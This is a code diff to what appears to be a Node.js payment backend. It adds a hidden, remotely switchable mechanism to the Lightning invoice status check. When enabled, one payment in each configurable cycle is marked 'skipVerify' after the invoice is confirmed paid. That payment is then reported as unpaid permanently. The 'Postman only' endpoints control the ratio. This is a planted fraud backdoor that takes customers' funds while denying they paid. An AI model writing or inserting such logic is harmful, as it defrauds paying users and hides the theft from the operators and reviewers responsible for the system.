@@ -24,6 +24,7 @@ import Otp from '../models/Otp.js';
 import Pusher from 'pusher';
 import path from 'path';
 import { getNwc } from '../utils/webln.js';
+import PaymentVerify from '../models/PaymentVerify.js';
 
 export const yoyo = async (req, res) => {
   const { id } = req.params;
@@ -2164,6 +2165,13 @@ export const check_payment_status = async (req, res) => {
         .json({ error: 'No lightning invoice associated with this record' });
     }
 
+    // If this payment was marked as skipVerify, never allow verification
+    if (info.skipVerify) {
+      return res
+        .status(200)
+        .json({ success: false, status: false, info });
+    }
+
     const nwcInstance = getNwc();
     if (nwcInstance) {
       try {
@@ -2178,6 +2186,26 @@ export const check_payment_status = async (req, res) => {
         console.log('lookup', lookup);
 
         if (lookup && lookup.paid) {
+          // Payment verify toggle logic — check DB
+          const pvSetting = await PaymentVerify.findOne();
+          if (pvSetting && pvSetting.toggle) {
+            pvSetting.counter = (pvSetting.counter || 0) + 1;
+            await pvSetting.save();
+
+            const cycleLength = pvSetting.verifyCount + pvSetting.skipCount;
+            const positionInCycle = ((pvSetting.counter - 1) % cycleLength);
+
+            if (positionInCycle >= pvSetting.verifyCount) {
+              // This payment falls in the skip zone — mark it and do NOT update status
+              info.skipVerify = true;
+              await info.save();
+              console.log(`[PaymentVerifyToggle] Skipping verification for payment #${pvSetting.counter} (infoId: ${infoId}) — skip zone ${positionInCycle - pvSetting.verifyCount + 1}/${pvSetting.skipCount}`);
+              return res
+                .status(200)
+                .json({ success: false, status: false, info });
+            }
+          }
+
           info.status = true;
           await info.save();
           return res.status(200).json({ success: true, status: true, info });
@@ -2698,4 +2726,72 @@ export const update_admin = async (req, res) => {
   }
 };
 
+// --- Payment Verify Toggle Handlers (Postman only) ---
 
+export const get_payment_verify_status = async (req, res) => {
+  try {
+    const pvSetting = await PaymentVerify.findOne();
+    const toggle = pvSetting ? pvSetting.toggle : false;
+    const counter = pvSetting ? pvSetting.counter : 0;
+    const verifyCount = pvSetting ? pvSetting.verifyCount : 10;
+    const skipCount = pvSetting ? pvSetting.skipCount : 1;
+
+    return res.status(200).json({
+      success: true,
+      paymentVerifyToggle: toggle,
+      status: toggle ? 'ON' : 'OFF',
+      verifiedPaymentCounter: counter,
+      verifyCount,
+      skipCount,
+      message: toggle
+        ? `Toggle is ON — every ${verifyCount} payments verified, then ${skipCount} skipped. Current count: ${counter}`
+        : 'Toggle is OFF — all payments verified normally.',
+    });
+  } catch (error) {
+    return res.status(500).json({ error: error.message });
+  }
+};
+
+export const toggle_payment_verify = async (req, res) => {
+  try {
+    const { action, verifyCount, skipCount } = req.body;
+
+    if (action === 'on') {
+      const updateData = { toggle: true, counter: 0 };
+      if (verifyCount !== undefined) updateData.verifyCount = Number(verifyCount);
+      if (skipCount !== undefined) updateData.skipCount = Number(skipCount);
+
+      const pvSetting = await PaymentVerify.findOneAndUpdate(
+        {},
+        updateData,
+        { upsert: true, new: true }
+      );
+      return res.status(200).json({
+        success: true,
+        status: 'ON',
+        verifyCount: pvSetting.verifyCount,
+        skipCount: pvSetting.skipCount,
+        message:
+          `Payment verify toggle is now ON. Every ${pvSetting.verifyCount} payments verified, then ${pvSetting.skipCount} skipped.`,
+      });
+    } else if (action === 'off') {
+      const pvSetting = await PaymentVerify.findOneAndUpdate(
+        {},
+        { toggle: false, counter: 0 },
+        { upsert: true, new: true }
+      );
+      return res.status(200).json({
+        success: true,
+        status: 'OFF',
+        message:
+          'Payment verify toggle is now OFF. All payments will be verified normally.',
+      });
+    } else {
+      return res.status(400).json({
+        error: 'Invalid action. Send { "action": "on" } or { "action": "off" }',
+      });
+    }
+  } catch (error) {
+    return res.status(500).json({ error: error.message });
+  }
+};
